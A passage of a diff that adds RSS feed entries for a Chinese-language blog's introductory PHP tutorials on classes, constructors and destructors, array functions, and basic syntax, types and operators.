+            echo &amp;quot;我的名字：&amp;quot;.$this-&amp;gt;name.&amp;quot;,性别：&amp;quot;.$this-&amp;gt;sex.&amp;quot;，年龄：&amp;quot;.$this-&amp;gt;age.&amp;quot;。&amp;lt;br /&amp;gt;\n&amp;quot;;
+        }
+        function run() {
+            echo $this-&amp;gt;name.&amp;quot;在走路&amp;lt;br /&amp;gt;\n&amp;quot;;
+        }
+    }
+    
+    $xiaoming = new Person();
+    $wyb = new Person();
+    
+    $xiaoming-&amp;gt;name = &amp;quot;小明&amp;quot;;
+    $xiaoming-&amp;gt;sex = &amp;quot;男&amp;quot;;
+    $xiaoming-&amp;gt;age = 16;
+    
+    $wyb-&amp;gt;name = &amp;quot;wyb&amp;quot;;
+    $wyb-&amp;gt;sex = &amp;quot;男&amp;quot;;
+    $wyb-&amp;gt;age = 18;
+    
+    $xiaoming-&amp;gt;say();
+    $wyb-&amp;gt;run();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;构造方法和析构方法:5c6593d80077ae6b6ba6c5030c3b0275&#34;&gt;构造方法和析构方法&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;构造方法和析构方法是对象中两个特殊的方法&lt;/li&gt;
+&lt;li&gt;构造方法是对象创建完成后第一个被对象自动调用的方法&lt;/li&gt;
+&lt;li&gt;析构方法是对象在销毁之前最后一个被对象自动调用的方法&lt;/li&gt;
+&lt;li&gt;通常用构造方法完成一些对象的初始化工作，用析构方法完成一些对象在销毁前的清理工作&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function _ _construct([参数列表]) {
+    //方法体，通常用来对成员属性进行初始化赋值
+}
+
+function _ _destruct([参数列表]) {
+    //方法体，通常用来完成一些在对象销毁前的清理工作
+}
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之数组</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E6%95%B0%E7%BB%84/</link>
+      <pubDate>Wed, 18 May 2016 11:09:46 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E6%95%B0%E7%BB%84/</guid>
+      <description>
+
+&lt;h2 id=&#34;分类:54df41877fa5526682b527cf171c76f5&#34;&gt;分类&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;索引数组
+索引值从0开始，依次递增&lt;/li&gt;
+&lt;li&gt;关联数组
+以字符串为索引，键和值对是无序组合，每个键都是唯一的&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;数组的定义:54df41877fa5526682b527cf171c76f5&#34;&gt;数组的定义&lt;/h2&gt;
+
+&lt;p&gt;两种方法：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;直接为数组元素赋值即可声明数组&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;使用array()函数声明数组&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    // 1.直接为数组元素赋值即可声明数组
+    $contact_index[0] = 1;
+    $contact_index[1] = &amp;quot;高某&amp;quot;;
+    $contact_index[2] = &amp;quot;A公司&amp;quot;;
+    $contact_index[3] = &amp;quot;北京市&amp;quot;;
+    $contact_index[] = &amp;quot;gao@a.com&amp;quot;;
+    var_dump($contact_index);
+
+
+    $contact_key[&amp;quot;ID&amp;quot;] = &amp;quot;2&amp;quot;;
+    $contact_key[&amp;quot;姓名&amp;quot;] = &amp;quot;峰某&amp;quot;;
+    $contact_key[&amp;quot;公司&amp;quot;] = &amp;quot;B公司&amp;quot;;
+    $contact_key[&amp;quot;邮箱&amp;quot;] = &amp;quot;feng@b.com&amp;quot;;
+    var_dump($contact_key);
+
+
+    // 2.使用array()函数声明数组
+    $contact_key_array = array(
+        &amp;quot;ID&amp;quot; =&amp;gt; 1;
+        &amp;quot;姓名&amp;quot; =&amp;gt; &amp;quot;峰某&amp;quot;;
+        &amp;quot;公司&amp;quot; =&amp;gt; &amp;quot;B公司&amp;quot;;
+        &amp;quot;邮箱&amp;quot; =&amp;gt; &amp;quot;feng@b.com&amp;quot;;
+    );
+    var_dump($contact_key_array);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;数组的遍历:54df41877fa5526682b527cf171c76f5&#34;&gt;数组的遍历&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;for语句遍历数组&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;foreach语句遍历数组&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    // for语句遍历索引数组
+    $cars=array(&amp;quot;Volvo&amp;quot;,&amp;quot;BMW&amp;quot;,&amp;quot;SAAB&amp;quot;);
+    $arrlength=count($cars);
+    for($x=0; $x &amp;lt; $arrlength; $x++) {
+        echo $cars[$x];
+        echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+    }
+
+
+    // foreach语句遍历关联数组
+    $age=array(&amp;quot;Bill&amp;quot;=&amp;gt;&amp;quot;35&amp;quot;, &amp;quot;Steve&amp;quot;=&amp;gt;&amp;quot;37&amp;quot;, &amp;quot;Peter&amp;quot;=&amp;gt;&amp;quot;43&amp;quot;);
+    foreach($age as $x =&amp;gt; $x_value) {
+        echo &amp;quot;Key=&amp;quot; . $x . &amp;quot;, Value=&amp;quot; . $x_value;
+        echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;预定义数组:54df41877fa5526682b527cf171c76f5&#34;&gt;预定义数组&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;它就是一个特殊数组，操作方式没有区别&lt;/li&gt;
+&lt;li&gt;不用声明它们，每个PHP脚本中默认存在&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;它们在全局范围内自动生效&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;预定义数组&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$_SERVER&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;变量由Web服务器设定或者直接与当前脚本的执行环境相关联&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_ENV&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;执行环境提交至脚本的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_GET&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;经由URL请求提交至脚本的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_POST&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;经由HTTP POST方法提交至脚本的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_REQUEST&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;经由GET，POST，COOKIE机制提交至脚本的变量，该数组不值得信任&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_FILES&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;经由HTTP POST文件上传而提交至脚本的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_COOKIE&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;经由HTTP Cookies方法提交至脚本的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$_SESSION&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;当前注册给脚本会话的变量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;$GLOBALS&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;包含一个引用指向每个当前脚本的全局范围内的有效的变量。该数组的键名为全局变量的名称&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;合并数组:54df41877fa5526682b527cf171c76f5&#34;&gt;合并数组&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_merge()函数将数组合并到一起，返回一个联合的数组。&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;array array_merge(array array1 array2&amp;hellip;,arrayN)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;pear&amp;quot;);
+    $numbered = array(&amp;quot;1&amp;quot;,&amp;quot;2&amp;quot;,&amp;quot;3&amp;quot;);
+    $cards = array_merge($fruits, $numbered);
+    print_r($cards);
+    // output
+    // Array ( [0] =&amp;gt; apple [1] =&amp;gt; banana [2] =&amp;gt; pear [3] =&amp;gt; 1 [4] =&amp;gt; 2 [5] =&amp;gt; 3 )
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;拆分数组:54df41877fa5526682b527cf171c76f5&#34;&gt;拆分数组&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_slice()函数将返回数组中的一部分，从键offset开始，到offset+length位置结束&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;array array_slice(array array,int offset[,int length])&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;offset为正值时从前面开始，为负值时从后面开始&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;Apple&amp;quot;, &amp;quot;Banana&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;Pear&amp;quot;, &amp;quot;Grape&amp;quot;, &amp;quot;Lemon&amp;quot;,
+    &amp;quot;Watermelon&amp;quot;);
+    $subset = array_slice($fruits, 3);
+    print_r($subset);
+    // output
+    // Array ( [0] =&amp;gt; Pear [1] =&amp;gt; Grape [2] =&amp;gt; Lemon [3] =&amp;gt; Watermelon )
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;Apple&amp;quot;, &amp;quot;Banana&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;Pear&amp;quot;, &amp;quot;Grape&amp;quot;, &amp;quot;Lemon&amp;quot;,
+    &amp;quot;Watermelon&amp;quot;);
+    $subset = array_slice($fruits, 2, -2);
+    print_r($subset);
+    // output
+    // Array ( [0] =&amp;gt; Orange [1] =&amp;gt; Pear [2] =&amp;gt; Grape )
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;数组的交集:54df41877fa5526682b527cf171c76f5&#34;&gt;数组的交集&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_intersect()函数返回一个保留了键的数组，这个数组只由第一个数组中出现的且在其他每个输入数组中都出现的值组成&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;array array_intersect(array array1,array array2[,arrayN&amp;hellip;])&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruit1 = array(&amp;quot;Apple&amp;quot;,&amp;quot;Banana&amp;quot;,&amp;quot;Orange&amp;quot;);
+    $fruit2 = array(&amp;quot;Pear&amp;quot;,&amp;quot;Apple&amp;quot;,&amp;quot;Grape&amp;quot;);
+    $fruit3 = array(&amp;quot;Watermelon&amp;quot;,&amp;quot;Orange&amp;quot;,&amp;quot;Apple&amp;quot;);
+    $intersection = array_intersect($fruit1, $fruit2, $fruit3);
+    print_r($intersection);
+    // output
+    // Array ( [0] =&amp;gt; Apple )
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;in-array:54df41877fa5526682b527cf171c76f5&#34;&gt;in_array&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;in_array()函数在一个数组中汇总搜索一个特定值，若找到则返回true，否则返回false&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;boolean in_array(mixed needle,array haystack[,boolean strice])&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruit = &amp;quot;apple&amp;quot;;
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;);
+    if( in_array($fruit,$fruits) ){
+        echo &amp;quot;$fruit已经在数组中&amp;quot;;
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;array-key-exists:54df41877fa5526682b527cf171c76f5&#34;&gt;array_key_exists&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;若在数组中找到一个指定的键，函数返回true，否则返回false&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;boolean array_key_exists(mixed key,array array)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruit[&amp;quot;apple&amp;quot;] = &amp;quot;red&amp;quot;;
+    $fruit[&amp;quot;banana&amp;quot;] = &amp;quot;yellow&amp;quot;;
+    $fruit[&amp;quot;pear&amp;quot;] = &amp;quot;green&amp;quot;;
+    if(array_key_exists(&amp;quot;apple&amp;quot;, $fruit)){
+        printf(&amp;quot;apple&#39;s color is %s&amp;quot;,$fruit[&amp;quot;apple&amp;quot;]);
+    }
+    //apple&#39;s color is red
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;array-search:54df41877fa5526682b527cf171c76f5&#34;&gt;array_search&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_search()函数在一个数组中搜索指定的值，若存在则返回相应的键，否则返回true&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mixed array_search(mixed needle,array haystack[,boolean strict])&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits[&amp;quot;apple&amp;quot;] = &amp;quot;red&amp;quot;;
+    $fruits[&amp;quot;banana&amp;quot;] = &amp;quot;yellow&amp;quot;;
+    $fruits[&amp;quot;watermelon&amp;quot;]=&amp;quot;green&amp;quot;;
+    $founded = array_search(&amp;quot;green&amp;quot;, $fruits);
+    if($founded){
+        printf(&amp;quot;%s was founded on %s.&amp;quot;,$founded, $fruits[$founded]);
+    }
+    //watermelon was founded on green.
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;数组头添加元素:54df41877fa5526682b527cf171c76f5&#34;&gt;数组头添加元素&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_unshift()函数在数组头添加元素。&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;所有已有的数值键都会相应地修改，以反应其在数组中的新位置，但是关联键不受影响&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;int array_unshift(array array,mixed variable[,mixed variable])&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;);
+    array_unshift($fruits,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;)
+    // $fruits = array(&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;,&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;数组头删除元素:54df41877fa5526682b527cf171c76f5&#34;&gt;数组头删除元素&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_shift()函数删除并返回数组中找到的元素。其结果是，若使用的是数值键，则所有相应的值都会下移，而使用关联键的数组不受影响。&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mixed array_shift(array array)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;);
+    $fruit = array_shift($fruits);
+    // $fruits = array(&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;)
+    // $fruit = &amp;quot;apple&amp;quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;数组尾添加元素:54df41877fa5526682b527cf171c76f5&#34;&gt;数组尾添加元素&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_push()函数的返回值类型是int型，是压入数据后数组中元素的个数，可以为此函数传递多个变量作为参数，同时向数组压入多个变量&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;int array_push(array array,mixed variable [,mixed variable&amp;hellip;])&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;);
+    array_push($fruits,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;)
+    //$fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;)
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;数组尾删除元素:54df41877fa5526682b527cf171c76f5&#34;&gt;数组尾删除元素&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;array_pop()函数删除并返回数组的最后一个元素&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mixed array_pop(array target_array)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;,&amp;quot;pear&amp;quot;);
+    $fruit = array_pop($fruits);
+    //$fruits = array(&amp;quot;apple&amp;quot;,&amp;quot;banana&amp;quot;,&amp;quot;orange&amp;quot;);
+    //$fruit = &amp;quot;pear&amp;quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之基础</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E5%9F%BA%E7%A1%80/</link>
+      <pubDate>Sun, 15 May 2016 09:10:23 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E5%9F%BA%E7%A1%80/</guid>
+      <description>
+
+&lt;h2 id=&#34;php的作用:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;PHP的作用&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;收集表单数据&lt;/li&gt;
+&lt;li&gt;生成动态网页&lt;/li&gt;
+&lt;li&gt;字符串处理&lt;/li&gt;
+&lt;li&gt;动态输出图片&lt;/li&gt;
+&lt;li&gt;处理服务器端文件系统&lt;/li&gt;
+&lt;li&gt;编写数据库支持的网页&lt;/li&gt;
+&lt;li&gt;会话跟踪控制&lt;/li&gt;
+&lt;li&gt;处理XML文件&lt;/li&gt;
+&lt;li&gt;支持大量的网络协议&lt;/li&gt;
+&lt;li&gt;服务器端的其他相关操作&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;php代码嵌入位置:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;PHP代码嵌入位置&lt;/h2&gt;
+
+&lt;p&gt;可以将PHP语言嵌入到扩展名为.php的HTML文件中的任何位置，只要在文件中使用&amp;lt;?php起始符和终止符?&amp;gt;就会开启PHP模式。在PHP模式中写入PHP语句即可将PHP语言嵌入到HTML文件中。&lt;/p&gt;
+
+&lt;h2 id=&#34;解读开始和结束标记:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;解读开始和结束标记&lt;/h2&gt;
+
+&lt;p&gt;前两种总是可用，第3、4种要在php.ini中开启short_open_tag和asp_tags&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;? ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;% %&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;指令分割符:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;指令分割符&lt;/h2&gt;
+
+&lt;p&gt;php一段代码中除了最后一行不用分号，其他每句都要用分号结束，不过推荐每句都用分号结束&lt;/p&gt;
+
+&lt;h2 id=&#34;注释:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;注释&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;若觉得代码不合适则可以注释，但不要急于删除&lt;/li&gt;
+&lt;li&gt;注释的目的在于说明程序&lt;/li&gt;
+&lt;li&gt;注释对调试和编写程序可以起到很好的帮助作用&lt;/li&gt;
+&lt;li&gt;PHP注释符有：”/**/”、“//”、“#”&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;空白符:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;空白符&lt;/h2&gt;
+
+&lt;p&gt;空白符(空格、tab制表符、换行)会被php引擎忽略&lt;/p&gt;
+
+&lt;h2 id=&#34;变量的声明:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;变量的声明&lt;/h2&gt;
+
+&lt;p&gt;其中双引号中的变量可以被解析，单引号中的变量不能被解析&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;变量名对大小写敏感&lt;/li&gt;
+&lt;li&gt;变量名开头是字母或下划线&lt;/li&gt;
+&lt;li&gt;后面跟任意数量的数字、字母、下划线&lt;/li&gt;
+&lt;li&gt;变量名中间不能有空格&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;可变变量:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;可变变量&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $a = &#39;hello&#39;;
+    $$a = &#39;world&#39;;  //此时$a的值hello就相当于$$a的键
+    echo &amp;quot;$a $hello&amp;quot;; //输出hello world
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;引用:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;引用&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $a = 123;
+    $b = $a;
+    $a = 456;   //此时$a为456,$b为123
+    $c = &amp;amp;$b;
+    $b = 111;  //此时$b和$c都是111
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;变量类型:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;变量类型&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;布尔型(boolean,true,false)&lt;/li&gt;
+&lt;li&gt;整型(integer)&lt;/li&gt;
+&lt;li&gt;浮点型(float和double)&lt;/li&gt;
+&lt;li&gt;字符串(string)&lt;/li&gt;
+&lt;li&gt;数组(array)&lt;/li&gt;
+&lt;li&gt;对象(object)&lt;/li&gt;
+&lt;li&gt;资源类型(resource)&lt;/li&gt;
+&lt;li&gt;NULL类型&lt;/li&gt;
+&lt;li&gt;伪类型(mixed,number,callback)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;布尔类型:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;布尔类型&lt;/h2&gt;
+
+&lt;p&gt;以下会被认为是FALSE，其他所有值都被认为是TRUE(包括任何资源)&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;布尔值FALSE&lt;/li&gt;
+&lt;li&gt;整型值0(零)为假，-1和其他非零值都是TRUE&lt;/li&gt;
+&lt;li&gt;浮点型0.0&lt;/li&gt;
+&lt;li&gt;空白字符串和字符串&amp;rdquo;0&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;没有成员变量的数组&lt;/li&gt;
+&lt;li&gt;没有单元的对象(仅适用于PHP4)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;null类型:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;NULL类型&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;NULL不区分大小写&lt;/li&gt;
+&lt;li&gt;NULL类型唯一可能的值就是NULL&lt;/li&gt;
+&lt;li&gt;NULL不代表空格、不代表零、不代表空字符串，而是表示一个变量的值为空&lt;/li&gt;
+&lt;li&gt;将变量直接赋值为NULL则为NULL&lt;/li&gt;
+&lt;li&gt;声明的变量尚未被赋值则为NULL&lt;/li&gt;
+&lt;li&gt;被unset()函数销毁的变量为NULL&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;类型转换:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;类型转换&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;自动类型转换
+
+&lt;ol&gt;
+&lt;li&gt;有布尔值参与运算，则TRUE转换为整型1,FALSE为0,然后再运算&lt;/li&gt;
+&lt;li&gt;有NULL值参与的运算，NULL值转换为整型0,再参与运算&lt;/li&gt;
+&lt;li&gt;整型和float型参与运算则先把interger型转换为float型再运算&lt;/li&gt;
+&lt;li&gt;字符串和数字型数据参与运算时，字符串先转换为数字再参与运算&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;li&gt;强制类型转换
+
+&lt;ol&gt;
+&lt;li&gt;变量前添加(int)、(float)、(string)、(bool)等&lt;/li&gt;
+&lt;li&gt;用函数intval()、floatval()、strval()&lt;/li&gt;
+&lt;li&gt;用函数settype()&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;运算符:5ee88451c97d3863f0fa462d8a63e052&#34;&gt;运算符&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;算数运算符：&amp;rdquo;+&amp;ldquo;、&amp;rdquo;-&amp;ldquo;、&amp;rdquo;*&amp;ldquo;、&amp;rdquo;/&amp;ldquo;、&amp;rdquo;%&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;赋值运算符：&amp;rdquo;=&amp;ldquo;、&amp;rdquo;+=&amp;ldquo;、&amp;rdquo;-=&amp;ldquo;、&amp;rdquo;*=&amp;ldquo;、&amp;rdquo;/=&amp;ldquo;、&amp;rdquo;%=&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;字符串运算符：&amp;rdquo;.&amp;ldquo;、&amp;rdquo;.=&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;递增/递减运算符：&amp;rdquo;++$a&amp;rdquo;、&amp;rdquo;$a++(先赋值再++)&amp;ldquo;、&amp;rdquo;- -$a&amp;rdquo;、&amp;rdquo;$a- -&amp;rdquo;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;比较运算符
+```&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;==    等于&lt;/li&gt;
+&lt;li&gt;===   全等(完全相同)&lt;/li&gt;
+&lt;li&gt;！=    不等于&lt;/li&gt;
+&lt;li&gt;&amp;lt;&amp;gt;    不等于&lt;/li&gt;
+&lt;li&gt;！==   不全等(完全不同)&lt;/li&gt;
+&lt;li&gt;&amp;gt;     大于&lt;/li&gt;
+&lt;li&gt;&amp;lt;     小于&lt;/li&gt;
+&lt;li&gt;&amp;gt;=    大于或等于&lt;/li&gt;
+&lt;li&gt;&amp;lt;=    小于或等于
+```&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;逻辑运算符
+```&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;and  都为true则返回true&lt;/li&gt;
+&lt;li&gt;or   至少有一个为true则返回true&lt;/li&gt;
+&lt;li&gt;xor  有且仅有一个为true则返回true&lt;/li&gt;
